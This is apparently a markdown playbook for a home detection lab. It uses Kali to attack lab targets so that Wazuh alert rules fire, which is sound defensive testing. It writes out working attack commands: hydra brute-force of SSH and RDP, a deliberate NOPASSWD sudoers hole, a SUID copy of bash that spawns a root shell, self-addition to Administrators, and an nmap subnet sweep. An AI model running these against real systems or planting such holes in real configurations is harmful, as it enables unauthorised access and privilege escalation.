# Threat Simulation Playbook (Kali → Targets)

Run these from `kali-attacker` (192.168.56.30) against the lab targets to generate real alerts and validate detection rules. **Lab-only — never run against systems you don't own.**

## Scenario 1 — SSH brute force (validates rules 100010/100011)

```bash
# Build a small password list for the lab (don't use real credentials)
echo -e "password\n123456\nadmin\nletmein\nqwerty\nchangeme" > passlist.txt

hydra -l ubuntuadmin -P passlist.txt ssh://192.168.56.21 -t 4
```
Expected result: Wazuh dashboard shows a level-10 alert ("SSH brute force attempt") within ~2 minutes, escalating to level-12 if you repeat the burst.

## Scenario 2 — RDP brute force (validates rule 100020)

```bash
hydra -l Administrator -P passlist.txt rdp://192.168.56.20
```
Expected result: Windows Security Event 4625 floods, correlated into a single level-10 alert on the manager.

## Scenario 3 — Linux privilege escalation via sudo misconfig

On `ubuntu-target`, intentionally misconfigure a low-priv account for the exercise:
```bash
echo "labuser ALL=(ALL) NOPASSWD: /usr/bin/passwd" | sudo tee /etc/sudoers.d/lab-exercise
```
From Kali (via a reverse shell or SSH as `labuser`), simulate the escalation:
```bash
sudo /usr/bin/passwd root
```
Expected result: rule 100030 fires (level 12) — "Suspicious root password change via sudo."

## Scenario 4 — SUID-based privilege escalation

On `ubuntu-target`:
```bash
sudo cp /bin/bash /tmp/rootbash
sudo chmod +s /tmp/rootbash
/tmp/rootbash -p     # spawns a root shell
```
Expected result: auditd `privesc_watch` key triggers, rule 100031 fires.

## Scenario 5 — Windows local admin group escalation

On `win-target` (simulating a compromised low-priv account escalating itself):
```powershell
net localgroup Administrators labuser /add
```
Expected result: Event 4732 → rule 100040 fires (level 12).

## Scenario 6 — Network reconnaissance (baseline, not a hard detection but useful for FIM/traffic tuning)

```bash
nmap -sV -O 192.168.56.0/24
```
Use this to observe how much "normal" scan noise appears and confirm it isn't over-alerting after tuning.

## Recording results

For every run, log: timestamp, scenario, expected rule ID, whether it fired, time-to-alert, and any false positives it triggered. Feed this into `scripts/log_correlator.py` and `scripts/trend_report.py` to produce the trend charts referenced in `CHANGELOG.md`.
